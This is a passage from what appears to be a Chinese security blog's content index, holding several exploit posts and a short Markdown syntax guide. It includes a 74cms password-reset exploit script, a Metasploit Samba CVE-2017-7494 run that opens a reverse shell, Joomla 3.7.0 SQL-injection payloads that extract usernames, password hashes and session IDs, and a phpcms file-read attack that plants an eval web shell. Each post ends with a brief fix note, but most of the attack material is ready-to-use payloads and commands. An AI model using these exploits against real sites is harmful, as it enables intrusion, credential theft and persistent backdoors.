strlen($encrypt_key) ? 0 : $ctr; $tmp .= $txt[$i] ^ $encrypt_key[$ctr++]; &#125; return $tmp;&#125; $email='test123@test.com';$a = array('e'=&gt;$email,'k'=&gt;substr(md5($email.'9487070991'),8,16),'t'=&gt;'9487070991');$test = http_build_query($a);echo urlencode(encrypt($test));?&gt; 获取key访问下面链接，可以直接设置email新密码http://127.0.0.1/74cms/index.php?m=&amp;c=members&amp;a=user_setpass&amp;key=$key 原文链接：http://www.0day5.com/archives/4276/","tags":[{"name":"74cms","slug":"74cms","permalink":"https://firedebug.github.io/tags/74cms/"}]},{"title":"samba远程代码执行漏洞","date":"2017-05-26T08:06:30.000Z","path":"Linux/POC/samba远程代码执行漏洞/","text":"漏洞版本： Samba 3.5.0之后到4.6.4/4.5.10/4.4.14测试版本：CVE： CVE-2017-7494 漏洞描述2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。端口445。 触发条件 服务器打开了文件/打印机共享端口445 共享文件拥有访问以及写入权限 攻击者知道共享的目录路径 漏洞测试测试环境123$ docker pull medicean/vulapps:s_samba_1启动环境$ docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1 msf攻击模块https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475msf exploit(is_known_pipename) &gt; show optionsModule options (exploit/linux/samba/is_known_pipename): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168.230.143 yes The target address RPORT 445 yes The SMB service port SMB_FOLDER no The directory to use within the writeable SMB share SMB_SHARE_BASE no The remote filesystem path correlating with the SMB share name SMB_SHARE_NAME no The name of the SMB share containing a writeable directoryPayload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.230.131 yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 2 Linux x86_64msf exploit(is_known_pipename) &gt; exploit[*] Started reverse TCP handler on 192.168.230.131:4444 [*] 192.168.230.143:445 - Using location \\\\192.168.230.143\\share\\ for the path[*] 192.168.230.143:445 - Payload is stored in //192.168.230.143/share/ as ZYLLXHbN.so[*] 192.168.230.143:445 - Trying location /volume1/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume1/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume1/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume1/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume2/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume2/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume2/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume2/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume3/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume3/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume3/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /volume3/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /shared/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /shared/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /shared/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /shared/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/usb/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/usb/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/usb/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/usb/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /media/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /media/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /media/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /media/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/media/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/media/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/media/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /mnt/media/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /var/samba/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /var/samba/share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /var/samba/SHARE/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /var/samba/Share/ZYLLXHbN.so...[*] 192.168.230.143:445 - Trying location /tmp/ZYLLXHbN.so...[*] Command shell session 1 opened (192.168.230.131:4444 -&gt; 192.168.230.143:45132) at 2017-05-08 06:42:05 -0400iduid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup) 漏洞修复升级软件或在smb.conf的[global]节点下增加nt pipe support = no 选项，然后重新启动samba服务。","tags":[{"name":"samba","slug":"samba","permalink":"https://firedebug.github.io/tags/samba/"}]},{"title":"Joomla3.7.0 SQL注入","date":"2017-05-24T06:27:21.000Z","path":"PHP/Joomla3.7.0SQL注入/","text":"漏洞版本： Joomla! 3.7.0测试版本： Joomla! 3.7.0CVE: CVE-2017-8917 漏洞描述 Joomla3.7.0新引入插件”com_fields”，这个组件可任意访问，由于对数据过滤不严导致SQL注入。 漏洞分析\\joomla370\\components\\com_fields\\controller.php文件中类FieldsController12345678910if ($this-&gt;input-&gt;get('view') === 'fields' &amp;&amp; $this-&gt;input-&gt;get('layout') === 'modal') &#123; // Load the backend language file. $lang = JFactory::getLanguage(); $lang-&gt;load('com_fields', JPATH_ADMINISTRATOR); //joomla370\\administrator $config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR; //D:\\phpStudy\\WWW\\joomla370\\administrator/components/com_fields &#125; parent::__construct($config); //D:\\phpStudy\\WWW\\joomla370\\libraries\\legacy\\controller\\legacy.php 调用父类parent::construct(),跟踪文件joomla370\\libraries\\legacy\\controller\\legacy.php中父类JControllerLegacy，依次调用getInstance、construct，定义一些路径信息。1234567891011121314foreach ($rMethods as $rMethod)&#123; $mName = $rMethod-&gt;getName(); //string(11) \"__construct\" // Add default display method if not explicitly declared. if (!in_array($mName, $xMethods) || $mName == 'display') &#123; $this-&gt;methods[] = strtolower($mName); // Auto register the methods as tasks. $this-&gt;taskMap[strtolower($mName)] = $mName; //array(1) &#123; [\"display\"]=&gt; string(7) \"display\" &#125; &#125;&#125; 123456789101112131415public function __construct($config = array()) &#123; ....// Set the default model search path if (array_key_exists('model_path', $config)) &#123; // User-defined dirs $this-&gt;addModelPath($config['model_path'], $this-&gt;model_prefix); &#125; else &#123; $this-&gt;addModelPath($this-&gt;basePath . '/models', $this-&gt;model_prefix); //D:\\phpStudy\\WWW\\joomla370\\administrator/components/com_fields/models &#125; 调用display方法，创建model123456789101112131415161718public function display($cachable = false, $urlparams = array()) &#123; $document = JFactory::getDocument(); $viewType = $document-&gt;getType(); //string(4) \"html\" $viewName = $this-&gt;input-&gt;get('view', $this-&gt;default_view);//$this-&gt;default_view = fields,string(6) \"fields\" $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string'); //string(5) \"modal\" $view = $this-&gt;getView($viewName, $viewType, '', array('base_path' =&gt; $this-&gt;basePath, 'layout' =&gt; $viewLayout)); // Get/Create the model if ($model = $this-&gt;getModel($viewName)) &#123; // Push the model into the view (as default) $view-&gt;setModel($model, true); &#125; ..... else &#123; $view-&gt;display(); &#125; getview取得视图，getmodel-&gt;setmodel实例化,最后$view-&gt;display,调用\\joomla370\\administrator\\components\\com_fields\\views\\fields\\view.html.php中类FieldsViewFields的display方法。12345678public function display($tpl = null)&#123; $this-&gt;state = $this-&gt;get('State'); //object(JObject) D:\\phpStudy\\WWW\\joomla370\\libraries\\legacy\\view\\legacy.php $this-&gt;items = $this-&gt;get('Items'); $this-&gt;pagination = $this-&gt;get('Pagination'); $this-&gt;filterForm = $this-&gt;get('FilterForm'); $this-&gt;activeFilters = $this-&gt;get('ActiveFilters'); ..... 调用joomla370\\libraries\\legacy\\view\\legacy.php中JViewLegacyget方法。1234567891011121314151617181920212223242526272829public function get($property, $default = null) //string(5) \"State\" &#123; // If $model is null we use the default model if (is_null($default)) &#123; $model = $this-&gt;_defaultModel; //string(6) \"fields\" &#125; else &#123; $model = strtolower($default); //string(6) \"fields\" &#125; // First check to make sure the model requested exists if (isset($this-&gt;_models[$model])) //object(FieldsModelFields) &#123; // Model exists, let's build the method name $method = 'get' . ucfirst($property); //string(8) \"getState\" // Does the method exist? if (method_exists($this-&gt;_models[$model], $method)) &#123; // The method exists, let's call it and return what we get $result = $this-&gt;_models[$model]-&gt;$method(); //调用getState D:\\phpStudy\\WWW\\joomla370\\libraries\\legacy\\model\\legacy.php return $result; &#125; &#125; $result=$this-&gt;_model[$model]-&gt;$method()，调用\\joomla370\\libraries\\legacy\\model\\legacy.php中类JModelLegacy的getState方法1234567891011121314public function getState($property = null, $default = null) &#123; if (!$this-&gt;__state_set) &#123; // Protected method to auto-populate the model state. $this-&gt;populateState(); //D:\\phpStudy\\WWW\\joomla370\\administrator\\components\\com_fields\\models\\fields.php // Set the model state set flag to true. $this-&gt;__state_set = true; &#125; return $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default); &#125; 调用\\joomla370\\administrator\\components\\com_fields\\models\\fields.php中类FieldsModelFields的populateState方法，123456789101112131415161718protected function populateState($ordering = null, $direction = null) &#123; // List state information. parent::populateState('a.ordering', 'asc'); //D:\\phpStudy\\WWW\\joomla370\\libraries\\legacy\\model\\list.php $context = $this-&gt;getUserStateFromRequest($this-&gt;context . '.context', 'context', 'com_content.article', 'CMD'); $this-&gt;setState('filter.context', $context); // Split context into component and optional section $parts = FieldsHelper::extract($context); if ($parts) &#123; $this-&gt;setState('filter.component', $parts[0]); $this-&gt;setState('filter.section', $parts[1]); &#125; &#125; 又调用父类parent::populateState，跟踪文件\\joomla370\\libraries\\legacy\\model\\list.php中JModelList类的populateState方法，123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960protected function populateState($ordering = null, $direction = null) &#123; // If the context is set, assume that stateful lists are used. if ($this-&gt;context) //string(17) \"com_fields.fields\" &#123; $app = JFactory::getApplication(); //object(JApplicationSite) $inputFilter = JFilterInput::getInstance(); //object(JFilterInput) // Receive &amp; set filters if ($filters = $app-&gt;getUserStateFromRequest($this-&gt;context . '.filter', 'filter', array(), 'array')) //com_fields.fields.filter string(19) \"com_content.article\" &#123; foreach ($filters as $name =&gt; $value) &#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;filterBlacklist)) &#123; $this-&gt;setState('filter.' . $name, $value); &#125; &#125; &#125; $limit = 0; // Receive &amp; set list options if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array')) //array(1) &#123; [\"fullordering\"]=&gt; string(38) \"updatexml(1,concat(0x3e,database()),0)\" &#125; &#123; foreach ($list as $name =&gt; $value) &#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;listBlacklist)) &#123; // Extra validations switch ($name) &#123; case 'fullordering': $orderingParts = explode(' ', $value); if (count($orderingParts) &gt;= 2) &#123; // Latest part will be considered the direction $fullDirection = end($orderingParts); if (in_array(strtoupper($fullDirection), array('ASC', 'DESC', ''))) &#123; $this-&gt;setState('list.direction', $fullDirection); &#125; unset($orderingParts[count($orderingParts) - 1]); // The rest will be the ordering $fullOrdering = implode(' ', $orderingParts); if (in_array($fullOrdering, $this-&gt;filter_fields)) &#123; $this-&gt;setState('list.ordering', $fullOrdering); &#125; &#125; ...... 调用D:\\phpStudy\\WWW\\joomla370\\libraries\\cms\\application\\cms.php中类JApplicationCms的getUserStateFromRequest方法，getUserStateFromRequest注册变量，123456789101112131415public function getUserStateFromRequest($key, $request, $default = null, $type = 'none')&#123; $cur_state = $this-&gt;getUserState($key, $default); $new_state = $this-&gt;input-&gt;get($request, null, $type); if ($new_state === null) &#123; return $cur_state; &#125; // Save the new value only if it was set in this request. $this-&gt;setUserState($key, $new_state); return $new_state;&#125; 调用getUserState方法，123456789101112public function getUserState($key, $default = null)&#123; $session = JFactory::getSession(); $registry = $session-&gt;get('registry'); if (!is_null($registry)) &#123; return $registry-&gt;get($key, $default); &#125; return $default;&#125; $session = JFactory::getSession()，调用\\joomla370\\libraries\\joomla\\factory.php中类JFactory的getSession方法，和createSession方法。注册session,$registry注册返回list。通过getUserStateFromRequest,取list值给$list,遍历$list设置list.fullfullordering取出list.fullfullordering.1234public function display($tpl = null) &#123; $this-&gt;state = $this-&gt;get('State'); $this-&gt;items = $this-&gt;get('Items'); 调用\\joomla370\\libraries\\legacy\\model\\list.php中getItems方法12345678910111213141516171819202122232425public function getItems()&#123; // Get a storage key. $store = $this-&gt;getStoreId(); //string(32) \"fe326c1160d8d4a2ea5c1debd8dd5ef2\" // Try to load the data from internal storage. if (isset($this-&gt;cache[$store])) &#123; return $this-&gt;cache[$store]; &#125; try &#123; // Load the list items and add the items to the internal cache. $this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState('list.limit')); &#125; catch (RuntimeException $e) &#123; $this-&gt;setError($e-&gt;getMessage()); return false; &#125; return $this-&gt;cache[$store];&#125; 跟踪_getListQuery1234567891011121314151617protected function _getListQuery() //D:\\phpStudy\\WWW\\joomla370\\administrator\\components\\com_fields\\models\\fields.php &#123; // Capture the last store id used. static $lastStoreId; // Compute the current store id. $currentStoreId = $this-&gt;getStoreId(); // If the last store id is different from the current, refresh the query. if ($lastStoreId != $currentStoreId || empty($this-&gt;query)) &#123; $lastStoreId = $currentStoreId; $this-&gt;query = $this-&gt;getListQuery(); &#125; return $this-&gt;query; &#125; \\joomla370\\administrator\\components\\com_fields\\models\\fields.php跟踪getListQuery123456789101112131415161718192021protected function getListQuery() &#123; // Create a new query object. $db = $this-&gt;getDbo(); $query = $db-&gt;getQuery(true); $user = JFactory::getUser(); $app = JFactory::getApplication(); ...... $listOrdering = $this-&gt;getState('list.fullordering', 'a.ordering'); $orderDirn = ''; if (empty($listOrdering)) &#123; $listOrdering = $this-&gt;state-&gt;get('list.ordering', 'a.ordering'); $orderDirn = $this-&gt;state-&gt;get('list.direction', 'DESC'); &#125; $query-&gt;order($db-&gt;escape($listOrdering) . ' ' . $db-&gt;escape($orderDirn)); return $query; &#125; 拼接sql语句，order处调用list.fufuordering，带入order中造成注入。 漏洞利用查询数据库http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0)查询用户http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20concat(username,0x3a,password)%20from%20joomla370.y5s3b_users)),0)查询密码，报错长度限制，分两次查询http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20left(password,30)%20from%20joomla370.y5s3b_users)),0)http://127.0.0.1/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(select%20right(password,30)%20from%20joomla370.y5s3b_users)),0)查询登录sessionhttp://localhost/joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(1,(select session_id from joomla370.y5s3b_session where username in (select username from joomla370.y5s3b_users))),1) 漏洞修复升级joomla最新版。","tags":[{"name":"Joomla","slug":"Joomla","permalink":"https://firedebug.github.io/tags/Joomla/"}]},{"title":"phpcms文件读取漏洞","date":"2017-05-22T05:27:27.000Z","path":"PHP/phpcms文件读取漏洞/","text":"影响版本Phpcms V9.1.15 Release 20120606及之前版本 测试版本Phpcms V9.1.5 Release 20110705 漏洞描述phpcmsv9\\phpcms\\modules\\search\\index.php文件中public_get_suggest_keyword函数 漏洞利用访问连接：http://127.0.0.1/phpcmsv9/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php读取数据库配置，如果开启数据库远程连接，就可以添加用户密码。 登录后台拿shell界面-&gt;模板风格-&gt;default-&gt;详情列表-&gt;search文件夹中-&gt;编辑index.html，在后面添加代码 &lt;?php $shell = &apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos;;file_put_contents(&apos;shell.php&apos;,$shell);?&gt; 保存后，访问localhost/index.php?m=search，即可在根目录生成shell.php 漏洞修复补丁版本：patch_20120606_20120716_UTF8.zip","tags":[{"name":"phpcms","slug":"phpcms","permalink":"https://firedebug.github.io/tags/phpcms/"}]},{"title":"Makedown语法","date":"2017-05-22T05:27:27.000Z","path":"hexo/Makedown语法/","text":"Makedown语法标题# 一级标题## 二级标题….依次类推，共六极标题，建议#号后加入空格 列表无序列表只需要文字前加上-或*有序列表在文字前加1. 2.3. 第一个 第二个 引用只需要在文本前加入>即可 例如这样 图片和超链接图片为：![](){ImgCap}{/ImgCap}链接为：[]()图床？？？ 粗体和斜体粗体：两个**包含一段文本斜体：一个*包含一段文本 **粗体***斜体* 粗体部分 斜体部分 代码框输入tab或四个空格即可 Tab&lt;?php echo “23”;?&gt; &lt;?php echo &quot;234&quot;; ?&gt; 分割线三个***即可","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://firedebug.github.io/tags/Hexo/"}]}]